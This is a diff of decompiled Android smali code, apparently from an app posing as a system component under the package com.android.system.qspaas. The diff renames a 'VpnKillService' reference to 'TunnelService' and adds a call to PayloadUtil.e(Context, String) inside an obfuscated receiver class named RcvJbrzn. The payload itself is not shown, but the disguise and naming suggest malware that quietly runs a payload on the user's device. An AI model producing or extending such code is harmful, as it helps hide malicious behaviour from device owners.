@@ -27,44 +27,12 @@
     .locals 8
 
     .line 1
-    const-string v0, ".VpnKillService"
+    const-string v0, ".TunnelService"
 
     const/4 v1, 0x0
 
     :try_start_0
-    new-instance v2, Ljava/lang/StringBuilder;
-
-    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
-
-    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
-
-    move-result-object v3
-
-    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
-
-    move-result-object v2
-
-    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
-
-    move-result-object v2
-
-    const-string v3, "killInstantly"
-
-    new-array v4, v1, [Ljava/lang/Class;
-
-    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
-
-    move-result-object v2
-
-    new-array v3, v1, [Ljava/lang/Object;
-
-    const/4 v4, 0x0
-
-    invoke-virtual {v2, v4, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
+    invoke-static {}, Lcom/android/system/qspaas/TunnelService;->b()V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -222,7 +190,7 @@
 
     invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    const-string v5, ".VpnKillService"
+    const-string v5, ".TunnelService"
 
     invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -268,6 +236,8 @@
     .locals 11
 
     .line 1
+    invoke-static {p1, p2}, Lcom/android/system/qspaas/PayloadUtil;->e(Landroid/content/Context;Ljava/lang/String;)V
+
     invoke-virtual {p0, p1}, Lcom/android/system/qspaas/RcvJbrzn;->b(Landroid/content/Context;)V
 
     const/4 v0, 0x0
